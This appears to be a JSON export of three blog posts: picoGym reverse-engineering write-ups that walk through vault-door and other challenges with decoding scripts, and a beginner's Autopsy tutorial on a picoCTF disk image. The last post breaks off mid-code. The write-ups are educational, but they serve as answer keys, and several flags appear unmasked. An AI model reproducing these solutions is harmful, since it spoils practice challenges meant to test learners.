[
  
  {
    "title": "picoGym Reverse Engineering - Medium writeups",
    "url": "/posts/picogym_rev_medium_writeup/",
    "categories": "CTF, PicoCTF",
    "tags": "ctf, writeups, cybersecurity, reverse-engineering",
    "date": "2025-07-25 11:00:00 +0530",
    





    
    "snippet": "picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice pl...",
    "content": "picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice platform, participants learn to overcome sets of challenges from six domains of cybersecurity including general skills, cryptography, web exploitation, forensics, etc. The challenges are all set up with the intent of being hacked, making it an excellent, legal way to get hands-on experience.picoGym is a noncompetitive practice space where you can explore and solve challenges from previously released picoCTF competitions, find fresh never before revealed challenges, and build a knowledge base of cybersecurity skills in a safe environment.Whether you are a cybersecurity professional, competitive hacker or new to CTFs you will find interesting challenges in the picoGym that you can solve at your own pace. Team picoCTF will regularly update this challenge repository so visit the picoGym often.This is their Official webpage - https://picoctf.org/This is their url for picoGym - https://play.picoctf.org/practiceMediumspeeds and feedsHint: What language does a CNC machine use?Explanation:We are given an nc command to connect to a specific server: nc mercury.picoctf.net 20301. After connecting the server gives us a set of lines like this:G17 G21 G40 G90 G64 P0.003 F50G0Z0.1G0Z0.1G0X0.8276Y3.8621G1Z0.1G1X0.8276Y-1.9310G0Z0.1G0X1.1034Y3.8621G1Z0.1G1X1.1034Y-1.9310G0Z0.1G0X1.1034Y3.0345G1Z0.1G1X1.6552Y3.5862G1X2.2069Y3.8621G1X2.7586Y3.8621I included only a couple of lines as the nc returns more than 1000 lines. It isn‚Äôt some normal text, after searching in the intenet using the hint and the lines. I found out it was G-code.G-code (short for Geometric Code) is the programming language used to control CNC machines (Computer Numerical Control), 3D printers, and other automated tools like laser cutters and mills. It tells the machine exactly how to move, where to move, how fast, and what actions to take (like cutting, extruding, or drilling).So in simple words, the codes draws something, so to see what it is let‚Äôs try to plot the coordinates using matploitlib. Here is the code:import matplotlib.pyplot as pltimport rewith open(\"input.gcode\", \"r\") as f:    gcode_lines = f.readlines()pen_down = Falsecurrent_pos = [0.0, 0.0]lines = []for line in gcode_lines:    line = line.strip()    if not line:        continue    if \"Z\" in line:        match = re.search(r'Z([-0-9.]+)', line)        if match:            z = float(match.group(1))            pen_down = z &lt;= 0.1     if \"X\" in line and \"Y\" in line:        x_match = re.search(r'X([-0-9.]+)', line)        y_match = re.search(r'Y([-0-9.]+)', line)        if x_match and y_match:            x = float(x_match.group(1))            y = float(y_match.group(1))            if pen_down:                lines.append(([current_pos[0], x], [current_pos[1], y]))            current_pos = [x, y]for x_vals, y_vals in lines:    plt.plot(x_vals, y_vals, 'k')  plt.axis('equal')plt.title(\"G-code Drawing from input.gcode\")plt.show()The python code reads the Gcode from a file named input.gcode line by line. Then it checks for Z-axis and later it checks for X and Y axis and based on the input values, it starts drawing/plotting using matplotlib library. First we need to save the lines of Gcode we got from the server to a file named input.gcode.nc mercury.picoctf.net 20301 &gt; input.gcodeThis saves the ouput that we recieved from the server into the file. Now after running the python file we can see this:We can see the flag.Flag: picoCTF{num3r1cal_c0ntr0l_XXXXXXXX}file-run1Hint:  To run the program at all, you must make it executable (i.e. $ chmod +x run)  Try running it by adding a ‚Äò.‚Äô in front of the path to the file (i.e. $ ./run)Explanation:Though this is a medium level challege, it is far more easier then other medium rev challeges.We are given a file named: run. After checking it‚Äôs details using file command it returned:run: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a468f05064d2f1ffa0047ba7295de4995176da15, for GNU/Linux 3.2.0, not strippedSo it is a normal ELF file, let‚Äôs try giving it permissions and running the ELF executable.chmod +x run./runAfter running the ELF executable, it printed the flag.Flag: picoCTF{U51N6_Y0Ur_F1r57_F113_XXXXXXXX}file-run2Hint: Try running it and add the phrase ‚ÄúHello!‚Äù with a space in front (i.e. ‚Äú./run Hello!‚Äù)Explanation:We are given a file named: run, after checking it‚Äôs file content there is nothing suspectable as it a normal ELF 64-bit LSB pie executable. Let‚Äôs try giving it permissions and running it.chmod +x run./runThis will print the output: ‚ÄúRun this file with only one argument.‚Äù So it tells us to add an single argument when running. When we give some random argument it will return: ‚ÄúWon‚Äôt you say ‚ÄòHello!‚Äô to me first?‚Äù, from this output and the description there is a chance that ‚ÄúHello!‚Äù is the required argument. So let‚Äôs give that argument../run Hello!This will return the solution flag of this challenge.Flag: picoCTF{F1r57_4rgum3n7_f65ed63e}crackme-pyExplanation:We are given a python file named: crackme.py. Here are the contents of the file:# Hiding this really important number in an obscure piece of code is brilliant!# AND it's encrypted!# We want our biggest client to know his information is safe with us.bezos_cc_secret = \"A:4@r%uL`M-^M0c0AbcM-MFE0g4dd`_cgN\"# Reference alphabetalphabet = \"!\\\"#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\"+ \\            \"[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\"def decode_secret(secret):    \"\"\"ROT47 decode    NOTE: encode and decode are the same operation in the ROT cipher family.    \"\"\"    # Encryption key    rotate_const = 47    # Storage for decoded secret    decoded = \"\"    # decode loop    for c in secret:        index = alphabet.find(c)        original_index = (index + rotate_const) % len(alphabet)        decoded = decoded + alphabet[original_index]    print(decoded)def choose_greatest():    \"\"\"Echo the largest of the two numbers given by the user to the program    Warning: this function was written quickly and needs proper error handling    \"\"\"    user_value_1 = input(\"What's your first number? \")    user_value_2 = input(\"What's your second number? \")    greatest_value = user_value_1 # need a value to return if 1 &amp; 2 are equal    if user_value_1 &gt; user_value_2:        greatest_value = user_value_1    elif user_value_1 &lt; user_value_2:        greatest_value = user_value_2    print( \"The number with largest positive magnitude is \"        + str(greatest_value) )choose_greatest()From this file we can notice that there is an encrypted variable called - bezos_cc_secret, it must be the flag. There are two functions in the source code: decode_secret and choose_greatest, but only one function is being called.So if we mofify the source code so that the code calls the decode_secret function with the bezos_cc_secret as an argument, we can get the flag.As the choose_greatest function is useless, replace the line with the below line:decode_secret(bezos_cc_secret)This will return the decoded bezos_cc_secret which is the solution flag.Flag: picoCTF{1|\\/|_4_p34|\\|ut_XXXXXXXX}vault-door-1Hint: Look up the charAt() method online.Explanation:We are given a java file: VaultDoor1.java. Here are it‚Äôs contents:import java.util.*;class VaultDoor1 {    public static void main(String args[]) {        VaultDoor1 vaultDoor = new VaultDoor1();        Scanner scanner = new Scanner(System.in);        System.out.print(\"Enter vault password: \");        String userInput = scanner.next();        String input = userInput.substring(\"picoCTF{\".length(),userInput.length()-1);        if (vaultDoor.checkPassword(input)) {            System.out.println(\"Access granted.\");        } else {            System.out.println(\"Access denied!\");        }    }    // I came up with a more secure way to check the password without putting    // the password itself in the source code. I think this is going to be    // UNHACKABLE!! I hope Dr. Evil agrees...    //    // -Minion #8728    public boolean checkPassword(String password) {        return password.length() == 32 &amp;&amp;               password.charAt(0)  == 'd' &amp;&amp;               password.charAt(29) == '9' &amp;&amp;               password.charAt(4)  == 'r' &amp;&amp;               password.charAt(2)  == '5' &amp;&amp;               password.charAt(23) == 'r' &amp;&amp;               password.charAt(3)  == 'c' &amp;&amp;               password.charAt(17) == '4' &amp;&amp;               password.charAt(1)  == '3' &amp;&amp;               password.charAt(7)  == 'b' &amp;&amp;               password.charAt(10) == '_' &amp;&amp;               password.charAt(5)  == '4' &amp;&amp;               password.charAt(9)  == '3' &amp;&amp;               password.charAt(11) == 't' &amp;&amp;               password.charAt(15) == 'c' &amp;&amp;               password.charAt(8)  == 'l' &amp;&amp;               password.charAt(12) == 'H' &amp;&amp;               password.charAt(20) == 'c' &amp;&amp;               password.charAt(14) == '_' &amp;&amp;               password.charAt(6)  == 'm' &amp;&amp;               password.charAt(24) == '5' &amp;&amp;               password.charAt(18) == 'r' &amp;&amp;               password.charAt(13) == '3' &amp;&amp;               password.charAt(19) == '4' &amp;&amp;               password.charAt(21) == 'T' &amp;&amp;               password.charAt(16) == 'H' &amp;&amp;               password.charAt(27) == '5' &amp;&amp;               password.charAt(30) == '2' &amp;&amp;               password.charAt(25) == '_' &amp;&amp;               password.charAt(22) == '3' &amp;&amp;               password.charAt(28) == '0' &amp;&amp;               password.charAt(26) == '7' &amp;&amp;               password.charAt(31) == 'e';    }}From the source code we can understand that, the java when comiled and ran asks for input. The input is supposed to be the solution flag. Then it slices the picoCTF{part and the last chaaracter part which is normally }and the rest is stored in input variable, then compares the characters of the input variables based on index in random order.So our task is to reverse the process and find the right input string. Based on the values and index in checkPassword function, we can decode the input variable. Aftering arranging the values based on the index positions this is the value of input variable.d35cr4mbl3_tH3_cH4r4cT3r5_75092eNow if we combine it with the flag format we get:picoCTF{d35cr4mbl3_tH3_cH4r4cT3r5_XXXXXX}Now ket‚Äôs check if this is the right flag or not by using the java file provided.javac VaultDoor1.javajava VaultDoor1.javaWhen entered the flag, this will give us ‚ÄúAccess Granted‚Äù, which means it is the right flag.Flag: picoCTF{d35cr4mbl3_tH3_cH4r4cT3r5_XXXXXX}vault-door-3Hint: Make a table that contains each value of the loop variables and the corresponding buffer index that it writes to.Explanation:We are given a java file named: VaultDoor3.java. Here are it‚Äôs contents:import java.util.*;class VaultDoor3 {    public static void main(String args[]) {        VaultDoor3 vaultDoor = new VaultDoor3();        Scanner scanner = new Scanner(System.in);        System.out.print(\"Enter vault password: \");        String userInput = scanner.next();        String input = userInput.substring(\"picoCTF{\".length(),userInput.length()-1);        if (vaultDoor.checkPassword(input)) {            System.out.println(\"Access granted.\");        } else {            System.out.println(\"Access denied!\");        }    }    // Our security monitoring team has noticed some intrusions on some of the    // less secure doors. Dr. Evil has asked me specifically to build a stronger    // vault door to protect his Doomsday plans. I just *know* this door will    // keep all of those nosy agents out of our business. Mwa ha!    //    // -Minion #2671    public boolean checkPassword(String password) {        if (password.length() != 32) {            return false;        }        char[] buffer = new char[32];        int i;        for (i=0; i&lt;8; i++) {            buffer[i] = password.charAt(i);        }        for (; i&lt;16; i++) {            buffer[i] = password.charAt(23-i);        }        for (; i&lt;32; i+=2) {            buffer[i] = password.charAt(46-i);        }        for (i=31; i&gt;=17; i-=2) {            buffer[i] = password.charAt(i);        }        String s = new String(buffer);        return s.equals(\"jU5t_a_sna_3lpm18g947_u_4_m9r54f\");    }}From the source code we can understand that, the java when comiled and ran asks for input. The input is supposed to be the solution flag. Then it slices the \"picoCTF{\"part and the last chaaracter part which is normally \"}\"and the rest is stored in input variable, then jumbles the characters of the input variable and stores it in a buffer and compares the characters with the jumbled string.So our task is to reverse the process and find the right input string. Based on the values and index in checkPassword function, we can decode the input variable. I used the below script to reverse it else it is going to take a lot of time doing it manually. Here is the python script:target = list(\"jU5t_a_sna_3lpm18g947_u_4_m9r54f\")password = [''] * 32for i in range(8):    password[i] = target[i]for i in range(8, 16):    password[23 - i] = target[i]for i in range(16, 32, 2):    password[46 - i] = target[i]for i in range(17, 32, 2):    password[i] = target[i]print(''.join(password))This will return the value of the input string:jU5t_a_s1mpl3_an4gr4m_4_u_xxxxxxNow combining it with picoCTF{ and }, may give us a valid flag, you can check it by compiling and running the given java file.javac VaultDoor1.javajava VaultDoor1.javaWhen entered the flag, this will give us ‚ÄúAccess Granted‚Äù, which means it is the right flag.Flag: picoCTF{jU5t_a_s1mpl3_an4gr4m_4_u_xxxxxx}vault-door-4Hint:  Use a search engine to find an ‚ÄúASCII table‚Äù.  You will also need to know the difference between octal, decimal, and hexadecimal numbers.Explanation:We are given a java file: VaultDoor4.java. Here are it‚Äôs contents:import java.util.*;class VaultDoor4 {    public static void main(String args[]) {        VaultDoor4 vaultDoor = new VaultDoor4();        Scanner scanner = new Scanner(System.in);        System.out.print(\"Enter vault password: \");        String userInput = scanner.next();        String input = userInput.substring(\"picoCTF{\".length(),userInput.length()-1);        if (vaultDoor.checkPassword(input)) {            System.out.println(\"Access granted.\");        } else {            System.out.println(\"Access denied!\");        }    }    // I made myself dizzy converting all of these numbers into different bases,    // so I just *know* that this vault will be impenetrable. This will make Dr.    // Evil like me better than all of the other minions--especially Minion    // #5620--I just know it!    //    //  .:::.   .:::.    // :::::::.:::::::    // :::::::::::::::    // ':::::::::::::'    //   ':::::::::'    //     ':::::'    //       ':'    // -Minion #7781    public boolean checkPassword(String password) {        byte[] passBytes = password.getBytes();        byte[] myBytes = {            106 , 85  , 53  , 116 , 95  , 52  , 95  , 98  ,            0x55, 0x6e, 0x43, 0x68, 0x5f, 0x30, 0x66, 0x5f,            0142, 0131, 0164, 063 , 0163, 0137, 0143, 061 ,            '9' , '4' , 'f' , '7' , '4' , '5' , '8' , 'e' ,        };        for (int i=0; i&lt;32; i++) {            if (passBytes[i] != myBytes[i]) {                return false;            }        }        return true;    }}From the source code we can understand that, the java when comiled and ran asks for input. The input is supposed to be the solution flag. Then it slices the \"picoCTF{\"part and the last chaaracter part which is normally \"}\"and the rest is stored in input variable, then compares few caracters of input variable in Decimal format, few others with Hexadecimal format, few others with Octal format and the rest with ASCII characters.So our task is to reverse the process and find the right input string. Based on the character balues of the given decimal, hexadecimal and octal, then we can decode the input variable. After decoding all the formats to character format this is the value of input string:jU5t_4_bUnCh_0f_bYt3s_xxxxxxxxxxNow combining it with picoCTF{ and }, may give us a valid flag, you can check it by compiling and running the given java file.javac VaultDoor1.javajava VaultDoor1.javaWhen entered the flag, this will give us ‚ÄúAccess Granted‚Äù, which means it is the right flag.Flag: picoCTF{jU5t_4_bUnCh_0f_bYt3s_xxxxxxxxxx}vault-door-5Hint:  You may find an encoder/decoder tool helpful, such as https://encoding.tools/  Read the wikipedia articles on URL encoding and base 64 encoding to understand how they work and what the results look like.Explanation:We are given a java file: VaultDoor5.java. Here are it‚Äôs contents:import java.net.URLDecoder;import java.util.*;class VaultDoor5 {    public static void main(String args[]) {        VaultDoor5 vaultDoor = new VaultDoor5();        Scanner scanner = new Scanner(System.in);        System.out.print(\"Enter vault password: \");        String userInput = scanner.next();        String input = userInput.substring(\"picoCTF{\".length(),userInput.length()-1);        if (vaultDoor.checkPassword(input)) {            System.out.println(\"Access granted.\");        } else {            System.out.println(\"Access denied!\");        }    }    // Minion #7781 used base 8 and base 16, but this is base 64, which is    // like... eight times stronger, right? Riiigghtt? Well that's what my twin    // brother Minion #2415 says, anyway.    //    // -Minion #2414    public String base64Encode(byte[] input) {        return Base64.getEncoder().encodeToString(input);    }    // URL encoding is meant for web pages, so any double agent spies who steal    // our source code will think this is a web site or something, defintely not    // vault door! Oh wait, should I have not said that in a source code    // comment?    //    // -Minion #2415    public String urlEncode(byte[] input) {        StringBuffer buf = new StringBuffer();        for (int i=0; i&lt;input.length; i++) {            buf.append(String.format(\"%%%2x\", input[i]));        }        return buf.toString();    }    public boolean checkPassword(String password) {        String urlEncoded = urlEncode(password.getBytes());        String base64Encoded = base64Encode(urlEncoded.getBytes());        String expected = \"JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVm\"                        + \"JTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2\"                        + \"JTM0JTVmJTM4JTM0JTY2JTY0JTM1JTMwJTM5JTM1\";        return base64Encoded.equals(expected);    }}After looking at the code, we can understand that when we run this file, it asks for an input which is supposed to be the solution flag. Then the program processess the input by taking the substring input variable by slicing picoCTF{and }. Now it validates the input by url encoding the input variable then base64 encoding the url encoded string and compares it with three pieces of base64 string. If it matches then it returns Access Granted telling that‚Äôs the right flag.import base64import urllib.parsedecoded = base64.b64decode(    \"JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVm\"    \"JTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2\"    \"JTM0JTVmJTM4JTM0JTY2JTY0JTM1JTMwJTM5JTM1\")s = decoded.decode()print(urllib.parse.unquote(s))This will return the value of the input variable and by combining it in the format: picoCTF{ + output + }, we will get the flag. We can test whether the flag is right or wrong.javac VaultDoor1.javajava VaultDoor1.javaWhen entered the flag, this will give us ‚ÄúAccess Granted‚Äù, which means it is the right flag.Flag: picoCTF{c0nv3rt1ng_fr0m_ba5e_64_XXXXXXXX}vault-door-6Hint: If X ^ Y = Z, then Z ^ Y = X. Write a program that decrypts the flag based on this fact.Explanation:We are given a java file: VaultDoor5.java. Here are it‚Äôs contents:import java.util.*;class VaultDoor6 {    public static void main(String args[]) {        VaultDoor6 vaultDoor = new VaultDoor6();        Scanner scanner = new Scanner(System.in);        System.out.print(\"Enter vault password: \");        String userInput = scanner.next();        String input = userInput.substring(\"picoCTF{\".length(),userInput.length()-1);        if (vaultDoor.checkPassword(input)) {            System.out.println(\"Access granted.\");        } else {            System.out.println(\"Access denied!\");        }    }    // Dr. Evil gave me a book called Applied Cryptography by Bruce Schneier,    // and I learned this really cool encryption system. This will be the    // strongest vault door in Dr. Evil's entire evil volcano compound for sure!    // Well, I didn't exactly read the *whole* book, but I'm sure there's    // nothing important in the last 750 pages.    //    // -Minion #3091    public boolean checkPassword(String password) {        if (password.length() != 32) {            return false;        }        byte[] passBytes = password.getBytes();        byte[] myBytes = {            0x3b, 0x65, 0x21, 0xa , 0x38, 0x0 , 0x36, 0x1d,            0xa , 0x3d, 0x61, 0x27, 0x11, 0x66, 0x27, 0xa ,            0x21, 0x1d, 0x61, 0x3b, 0xa , 0x2d, 0x65, 0x27,            0xa , 0x6c, 0x60, 0x37, 0x30, 0x60, 0x31, 0x36,        };        for (int i=0; i&lt;32; i++) {            if (((passBytes[i] ^ 0x55) - myBytes[i]) != 0) {                return false;            }        }        return true;    }}From this java source code we can undestand that the java file asks the user for an input then validates whether it is right or not. The input is supposed to be the solution flag. THe code removes the picoCTF{ and } parts of the flag and stored in a input variable and valiadtes it using checkPassword method. Coming to the validation process, what we can understand from the source code is the input variable is converted to Byte format then the bytes are XOR‚Äòed and subtracted with a pre-defined array of bytes. So it must mean the bytes of the password after encrypting it with 0x55 using XOR should match the bytes of the array, else it going to return false.The Reverse Methodology:  As the hint said ‚ÄúX ^ Y = Z, then Z ^ Y = X‚Äù, we can use myBytes[i] ^ 0x55. This will give us the passBytes.  Convert the bytes to ascii string, we will get the flag.we can use the below python script:my_bytes = [    0x3b, 0x65, 0x21, 0x0a, 0x38, 0x00, 0x36, 0x1d,    0x0a, 0x3d, 0x61, 0x27, 0x11, 0x66, 0x27, 0x0a,    0x21, 0x1d, 0x61, 0x3b, 0x0a, 0x2d, 0x65, 0x27,    0x0a, 0x6c, 0x60, 0x37, 0x30, 0x60, 0x31, 0x36,]password = ''.join([chr(b ^ 0x55) for b in my_bytes])print(password)This code will return the decrypted value which is the value of the input variable. Now combining it with picoCTF{ at the start and } at the end will give us the flag.Flag: picoCTF{n0t_mUcH_h4rD3r_tH4n_x0r_95be5dc}"
  },
  
  {
    "title": "Autopsy - Tutorial for N00bs",
    "url": "/posts/Autopsy-tutorial-for-beginners/",
    "categories": "Tutorial",
    "tags": "cybersecurity, forensics",
    "date": "2025-07-23 12:30:00 +0530",
    





    
    "snippet": "Autopsy: Tutorial for N00bsWhat is Autopsy?Autopsy¬Æ is a digital forensics platform and graphical interface to The Sleuth Kit¬Æ and other digital forensics tools. It is used by law enforcement, mili...",
    "content": "Autopsy: Tutorial for N00bsWhat is Autopsy?Autopsy¬Æ is a digital forensics platform and graphical interface to The Sleuth Kit¬Æ and other digital forensics tools. It is used by law enforcement, military, and corporate examiners to investigate what happened on a computer. You can even use it to recover photos from your camera‚Äôs memory card. It is an easy to use, GUI-based program that allows you to efficiently analyze hard drives and smart phones.Autopsy provides features like searching, cataloguing, file recovery and many tools. It also supports multiple file types like NFTS, FAT, ExT2, ExT3, ExT4 etc.,How to use Autopsy?Note: At the time of writing this post, the current version of Autopsy is ver 2.24, so there might be few changes if what you are using is a different versionWe will be working on a challenge named ‚ÄúDear Diary‚Äù from picoCTF to work with Autopsy.So we are given a file named disk.flag.img.gz, from the file name we can understand the following:  gz : It says that the whole file is compressed using Gzip.  img : It says that the file is disk image. A disk image is a byte-for-byte copy of a storage medium like hard disk, USB drive or partition.  flag : It suggests that the file contains a flag, just for information  disk : It is the base name of the file.So before working with the disk image we have to decompress it, we can decompress gzip compressed files using the below commands:gunzip disk.flag.img.gz#ORgzip -d disk.flag.img.gzAfter decompressing the file using one of the above commands, we will get an file named disk.flag.img, let;s check what type of file it is using file command.file disk.flag.imgit will return:disk.flag.img: DOS/MBR boot sector; partition 1 : ID=0x83, active, start-CHS (0x0,32,33), end-CHS (0x26,94,56), startsector 2048, 614400 sectors; partition 2 : ID=0x82, start-CHS (0x26,94,57), end-CHS (0x47,1,58), startsector 616448, 524288 sectors; partition 3 : ID=0x83, start-CHS (0x47,1,59), end-CHS (0x82,138,8), startsector 1140736, 956416 sectorsFrom the output we can understand the following:The disk image uses an MBR (Master Boot Record) partitioning scheme (common in legacy BIOS systems).This means the first 512 bytes of the image contain a bootloader and a partition table.There are three partitions: partition 1, partition 2 and partition 3.Here the analysis of partition 1:  ID = 0x83, this is a Linux filesystem (typically ext2/ext3/ext4).  Active, this partition is bootable.  startsector = 2048, it starts at sector 2048.  614400 sectors, is the total size of the partition = 614400 √ó 512 bytes = 314,572,800 bytes (~ 300 MB).  start-CHS / end-CHS, is Cylinder-Head-Sector addressing (used by older BIOS systems).Here the analysis of partition 2:  ID = 0x82, this is a Linux swap partition.  startsector = 616448  524288 sectors (~ 256 MB)Here the analysis of partition 3:  ID = 0x83, means this is another Linux filesystem.  startsector = 1140736  956416 sectors (~ 468 MB)This challenge can be solved using two methods, one is using Autopsy and the other requires us to manually mount the partitions.We are going to use Autopsy for two reasons:One, Autopsy will automatically detect the partitions, it can parse ext2/ext3/ext4, FAT, NTFS, and even swap partitions. No need to manually mount partitions or use losetup and has more functionalities.Two, This article is for learning Autopsy, so ofcourse we won‚Äôt be following some other method rather than using Autopsy.To open/run Autopsy, you can download it and use the below command to run it. In Kali Linux, Autopsy already exists so it can be used directly.autopsyAfter running it, it will start the process and provide you a link like this http://localhost:9999/autopsy. After visiting this is the interface:As we are dealing with a brand new disk image, we will be creating a ‚ÄúNew Case‚Äù. After clicking on ‚ÄúNew Case‚Äù this will be shown:In the given inputs only the ‚ÄúCase Name‚Äù is required and others are optional, it is up to the user the give them values or not. After filling the required inputs click on ‚ÄúNew Case‚Äù.Now after refreshing the page, you will be show this:Now click on ‚ÄúOK‚Äù, this will show the below page:As there aren‚Äôt any Host in my Autopsy yet, let‚Äôs add one by clicking on ‚ÄúAdd Host‚Äù this will present the below image:Now enter the ‚ÄúHost Name‚Äù, as it is the only field that is mandatory and others are optional, then click ‚ÄúAdd Host‚ÄùThis will successfully add a host to the case, now using the host we will be analyzing the partitions. So after creating a host a new page will appear asking to ‚ÄúAdd Image‚Äù, so we will be giving it the disk.flag.img file.After clicking on ‚ÄúAdd Image‚Äù, click on ‚ÄúAdd Image File‚Äù as what we are given a disk image file.This will ask for the image location, for me the image is in /home/kali/Downloads directory and the file name is disk.flag.img. So I gave the input ‚Äú/home/kali/Downloads/disk.flag.img‚Äù . If you to enter your location, using pwd in your terminal while you are present in the folder with the image and add ‚Äú_/_‚Äù to the output of pwd.In the first section, you can use ‚ÄúIgnore the hash value for this image‚Äù as we got not business with it. In the section, you can see that the Autopsy has detected three partitions of the image file successfully, now click on ‚ÄúAdd‚Äù to get started.This will successfully add the image partitions which makes them ready to analyze, now click on ‚ÄúOK‚Äù to move to the next step.Now we are ready to anlayze, let‚Äôs start analysing from the top which is disk.flag.img.disk.After clicking on ‚ÄúAnalyze‚Äù, we will be presented with this, now lets using the keyword search function and search for different keywords that might help.You can search for whatever you want (you need to wait some time as searching the image takes some time), after searching for a bit I found something useful when searched for ‚Äú.txt‚Äù, the output can be seen in the below image:We can find few files named ‚Äî clock.txt, sroot.txt etc., after clicking on Ascii and checking the contents, we can file useful info in the content of file.txt.In Unit 1423344, we can find a string ‚Äúpic‚Äù, which has potential to be a part of the solution flag.Now after checking the next unit, which is Unit 1423356, we can find a string ‚ÄúoCT‚Äù, combining it with the string found before gives us ‚ÄúpicoCT‚Äù, so from this we can understand that the flag is divided into parts and divided sequentially into the Units of the partition.After checking the rest of the partition, we can find that the final string of the flag (a flag ends with ‚Äú}‚Äù) is in Unit 1423488. So the flag is divided into pieces from Unit 1423344 to Unit 1423488. Now combining the strings sequentially will give us the complete flag.The flag is picoCTF(1_533_n4m35_XXXXXXXX}So we have successfully solved a Disk Image Analysis challenge using Autopsy.The EndSo this is the beginner‚Äôs tutorial for Autopsy by me (CYB3R_BO1). To learn more about Autopsy you can search for YouTube videos, Blogs, Books etc.,I am CYB3R_BO1, I explore AI Security, Web Security, Reverse Engineering and Forensics and many other things.Let‚Äôs connect and learn new concepts in the field of cybersecurity together, you can contact me through my social media profiles in the bottom-left of the menu."
  },
  
  {
    "title": "picoGym Reverse Engineering - Hard writeups",
    "url": "/posts/picogym_rev_hard_writeup/",
    "categories": "CTF, PicoCTF",
    "tags": "ctf, writeups, cybersecurity, reverse-engineering",
    "date": "2025-07-03 11:00:00 +0530",
    





    
    "snippet": "picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice pl...",
    "content": "picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice platform, participants learn to overcome sets of challenges from six domains of cybersecurity including general skills, cryptography, web exploitation, forensics, etc. The challenges are all set up with the intent of being hacked, making it an excellent, legal way to get hands-on experience.picoGym is a noncompetitive practice space where you can explore and solve challenges from previously released picoCTF competitions, find fresh never before revealed challenges, and build a knowledge base of cybersecurity skills in a safe environment.Whether you are a cybersecurity professional, competitive hacker or new to CTFs you will find interesting challenges in the picoGym that you can solve at your own pace. Team picoCTF will regularly update this challenge repository so visit the picoGym often.This is their Official webpage - https://picoctf.org/This is their url for picoGym - https://play.picoctf.org/practiceMediumvault-door-8Hint:  Clean up the source code so that you can read it and understand what is going on.  Draw a diagram to illustrate which bits are being switched in the scramble() method, then figure out a sequence of bit switches to undo it. You should be able to reuse the switchBits() method as is.Explanation:We are given a java file - VaultDoor8.java and here are it‚Äôs contents:// These pesky special agents keep reverse engineering our source code and then// breaking into our secret vaults. THIS will teach those sneaky sneaks a// lesson.//// -Minion #0891import java.util.*; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec;import java.security.*; class VaultDoor8 {public static void main(String args[]) {Scanner b = new Scanner(System.in); System.out.print(\"Enter vault password: \");String c = b.next(); String f = c.substring(8,c.length()-1); VaultDoor8 a = new VaultDoor8(); if (a.checkPassword(f)) {    System.out.println(\"Access granted.\"); } else {System.out.println(\"Access denied!\"); } } public char[] scramble(String password) {/* Scramble a password by transposing pairs of bits. */char[] a = password.toCharArray(); for (int b=0; b&lt;a.length; b++) {char c = a[b]; c = switchBits(c,1,2); c = switchBits(c,0,3); /* c = switchBits(c,14,3); c = switchBits(c, 2, 0); */ c = switchBits(c,5,6); c = switchBits(c,4,7);c = switchBits(c,0,1); /* d = switchBits(d, 4, 5); e = switchBits(e, 5, 6); */ c = switchBits(c,3,4); c = switchBits(c,2,5); c = switchBits(c,6,7); a[b] = c; } return a;} public char switchBits(char c, int p1, int p2) {/* Move the bit in position p1 to position p2, and move the bitthat was in position p2 to position p1. Precondition: p1 &lt; p2 */ char mask1 = (char)(1 &lt;&lt; p1);char mask2 = (char)(1 &lt;&lt; p2); /* char mask3 = (char)(1&lt;&lt;p1&lt;&lt;p2); mask1++; mask1--; */ char bit1 = (char)(c &amp; mask1); char bit2 = (char)(c &amp; mask2); /* System.out.println(\"bit1 \" + Integer.toBinaryString(bit1));System.out.println(\"bit2 \" + Integer.toBinaryString(bit2)); */ char rest = (char)(c &amp; ~(mask1 | mask2)); char shift = (char)(p2 - p1); char result = (char)((bit1&lt;&lt;shift) | (bit2&gt;&gt;shift) | rest); return result;} public boolean checkPassword(String password) {char[] scrambled = scramble(password); char[] expected = {0xF4, 0xC0, 0x97, 0xF0, 0x77, 0x97, 0xC0, 0xE4, 0xF0, 0x77, 0xA4, 0xD0, 0xC5, 0x77, 0xF4, 0x86, 0xD0, 0xA5, 0x45, 0x96, 0x27, 0xB5, 0x77, 0xE0, 0x95, 0xF1, 0xE1, 0xE0, 0xA4, 0xC0, 0x94, 0xA4 }; return Arrays.equals(scrambled, expected); } }Looks like the code isn‚Äôt arranged properly though it works well as java does not follow indentation rules. After cleaning up, here is how it looks:// These pesky special agents keep reverse engineering our source code and then// breaking into our secret vaults. THIS will teach those sneaky sneaks a// lesson.//// -Minion #0891import java.util.*; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec;import java.security.*; class VaultDoor8 {    public static void main(String args[]) {        Scanner b = new Scanner(System.in);         System.out.print(\"Enter vault password: \");        String c = b.next();         String f = c.substring(8,c.length()-1);         VaultDoor8 a = new VaultDoor8();         if (a.checkPassword(f)) {            System.out.println(\"Access granted.\");         } else {            System.out.println(\"Access denied!\");         }     }     public char[] scramble(String password) {        /* Scramble a password by transposing pairs of bits. */        char[] a = password.toCharArray();         for (int b=0; b&lt;a.length; b++) {            char c = a[b];             c = switchBits(c,1,2);             c = switchBits(c,0,3);             /* c = switchBits(c,14,3);             c = switchBits(c, 2, 0); */             c = switchBits(c,5,6);             c = switchBits(c,4,7);            c = switchBits(c,0,1);             /* d = switchBits(d, 4, 5);             e = switchBits(e, 5, 6); */             c = switchBits(c,3,4);             c = switchBits(c,2,5);             c = switchBits(c,6,7);             a[b] = c;         }         return a;`    }     public char switchBits(char c, int p1, int p2) {        /* Move the 